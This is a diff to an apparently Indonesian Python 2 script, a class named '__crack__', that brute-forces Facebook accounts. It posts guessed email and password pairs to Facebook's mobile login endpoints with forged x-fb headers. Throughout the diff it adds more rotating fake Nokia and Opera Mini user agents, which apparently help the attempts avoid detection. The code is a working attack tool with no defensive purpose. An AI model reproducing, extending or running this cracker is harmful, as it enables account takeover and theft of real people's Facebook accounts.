@@ -476,18 +476,18 @@ class __crack__:
                             moch_yayan()
                     print ' %s=================================================='%(N)
                     print ' %s[%s?%s] Pilih Metode Intip Anda. Silahkan coba satu²'%(N,K,N)
-                    print ' %s[%s1%s] Metode %sb-api %s(%sProses Cepat%s)'%(N,H,N,O,N,H,N)
-                    print ' %s[%s2%s] Metode %smbasic %s(%sProses Normal%s)'%(N,H,N,O,N,K,N)
-                    print ' %s[%s3%s] Metode %smobile %s(%sProses Lama%s)'%(N,H,N,O,N,M,N)
+                    print ' %s[%s1%s] Metode %sb-api %s(%sProses Cepat UA XpressMusic%s)'%(N,H,N,O,N,H,N)
+                    print ' %s[%s2%s] Metode %smbasic %s(%sProses Normal UA Random%s)'%(N,H,N,O,N,K,N)
+                    print ' %s[%s3%s] Metode %smobile %s(%sProses Lama UA Random%s)'%(N,H,N,O,N,M,N)
                     __yan__(pwek.split(','))
                     break
 
         elif ___yayanganteng___ in ('T', 't'):
             print ' %s=================================================='%(N)
             print ' %s[%s?%s] Pilih Metode Intip Anda. Silahkan coba satu²'%(N,K,N)
-            print ' %s[%s1%s] Metode %sb-api %s(%sProses Cepat%s)'%(N,H,N,O,N,H,N)
-            print ' %s[%s2%s] Metode %smbasic %s(%sProses Normal%s)'%(N,H,N,O,N,K,N)
-            print ' %s[%s3%s] Metode %smobile %s(%sProses Lama%s)'%(N,H,N,O,N,M,N)
+            print ' %s[%s1%s] Metode %sb-api %s(%sProses Cepat UA XpressMusic%s)'%(N,H,N,O,N,H,N)
+            print ' %s[%s2%s] Metode %smbasic %s(%sProses Normal UA Random%s)'%(N,H,N,O,N,K,N)
+            print ' %s[%s3%s] Metode %smobile %s(%sProses Lama UA Random%s)'%(N,H,N,O,N,M,N)
             self.__pler__()
         else:
             print '\n %s[%sx%s] y/t !'%(N,M,N)
@@ -541,7 +541,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-	    ua_mb = random.choice(['jBrowser/J2ME Profile/MIDP-1.0 Configuration/CLDC-1.0 (Google WAP Proxy/1.0)', 'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile'])
+	    ua_mb = random.choice(['jBrowser/J2ME Profile/MIDP-1.0 Configuration/CLDC-1.0 (Google WAP Proxy/1.0)', 'NokiaC2-05/2.0 (08.30) Profile/MIDP-2.1 Configuration/CLDC-1.1', 'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile', 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.7751; U; en) Presto/2.12.423 Version/12.16'])
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua_mb, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
             xo = aw.content
@@ -578,7 +578,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-	    ua_mobile = random.choice(['jBrowser/J2ME Profile/MIDP-1.0 Configuration/CLDC-1.0 (Google WAP Proxy/1.0)', 'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile'])
+	    ua_mobile = random.choice(['jBrowser/J2ME Profile/MIDP-1.0 Configuration/CLDC-1.0 (Google WAP Proxy/1.0)', 'NokiaC2-05/2.0 (08.30) Profile/MIDP-2.1 Configuration/CLDC-1.1', 'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile', 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.7751; U; en) Presto/2.12.423 Version/12.16'])
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua_mobile, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             ses = requests.Session()
             ses.get('https://m.facebook.com/')
